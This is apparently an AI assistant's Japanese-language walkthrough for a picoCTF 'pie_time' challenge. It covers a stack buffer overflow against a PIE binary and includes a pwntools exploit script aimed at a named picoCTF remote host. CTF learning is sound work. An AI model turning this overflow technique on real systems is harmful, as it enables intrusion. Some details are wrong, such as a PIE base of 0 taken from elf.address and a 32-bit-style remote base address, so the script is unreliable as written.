いい質問です！
このようなCTF問題で「**ソースコードとバイナリが提供されている**」ときは、以下のステップで進めるのが王道です。初めてでも迷わないように、**具体的な流れを完全ガイド**としてまとめました。

---

## 🔍 目標

リモートサーバに Exploit を投げて、**flag を出力させる（例: `picoCTF{...}`）**。

---

## ✅ ステップバイステップで進める方法

---

### ✅ 1. **ソースコードとバイナリをダウンロード**

サイトから以下2つのファイルを保存：

* `source.c` または `pie_time.c`（C言語ソース）
* `pie_time`（バイナリ）

```bash
wget [URL_TO_SOURCE]
wget [URL_TO_BINARY]
chmod +x pie_time
```

---

### ✅ 2. **`checksec` でセキュリティ機能確認**

```bash
checksec --file pie_time
```

出力例：

```
[*] '/path/pie_time'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

→ 重要なのは `PIE: ENABLED`
→ **アドレスが毎回変わる**ので、相対位置（オフセット）で攻略する必要がある。

---

### ✅ 3. **ソースコードを読む**

関数 `win()` や `flag()` を探してください。例：

```c
void win() {
    system("cat flag.txt");
}

void vuln() {
    char buf[40];
    gets(buf);
}
```

→ `gets(buf)` のように明らかに脆弱な入力があれば、**バッファオーバーフロー**で `win()` を呼び出せる。

---

### ✅ 4. **`nm` や `objdump` で関数のアドレスを調べる**

```bash
nm pie_time | grep win
```

出力例：

```
00001234 T win
```

→ **`win()` のオフセット**は `0x1234`

---

### ✅ 5. **`cyclic`でオフセット調査（何バイトでRIP上書きか）**

```bash
from pwn import *
print(cyclic(100))
```

出力文字列をペイロードとして与え、gdbでクラッシュしたRIPを見て逆算：

```bash
cyclic_find(0x6161616b)  # RIPの値からオフセット逆算
```

---

### ✅ 6. **Exploitスクリプトを書く**

```python
from pwn import *

elf = context.binary = ELF('./pie_time')
# ローカル実行
p = process(elf.path)

# win関数のオフセット
win_offset = elf.symbols['win']

# RIPまでのオフセット（例: 40バイト）
offset = 40

# 実行時のベースアドレス
p.recvuntil(b'> ')  # 入力待ちプロンプトまで読む
base_address = elf.address  # ローカルでは 0x555555554000 など

payload = b'A' * offset
payload += p64(base_address + win_offset)

p.sendline(payload)
p.interactive()
```

---

### ✅ 7. **リモート実行に切り替える**

```python
p = remote('rescued-float.picoctf.net', 50546)
```

* リモートでも`win()`のオフセットは同じ
* ただし PIE なので、**ベースアドレスが違う！**

  * ヒント：「ローカルとリモートのアドレス差を推測せよ」

例：

* ローカルで `win()` が `0x555555555234`
* オフセットは `0x1234`
* リモートではたとえば `0x56555000` がベースなら → `0x56556234`

---

## ✅ 補足：アドレスがわからない時は？

* `puts` などの出力でアドレスリークがあるか確認
* または bruteforce（総当たり）でベースアドレス推測（CTFなら256通り以内など）

---

## 🎯 最終的な目的

**リモート接続して、win関数を呼び出して `picoCTF{...}` を取得する！**

---

## 💬 次のステップは？

* ソースコードを貼ってくれれば、具体的な Exploit スクリプトを作成します。
* バイナリをアップロードしてくれれば、解析も代行できます。
* 「実行してみたけど動かない」などがあれば、出力内容を教えてください。

---

進め方がわかったら、ソースコードやバイナリの中身をぜひ共有してください！
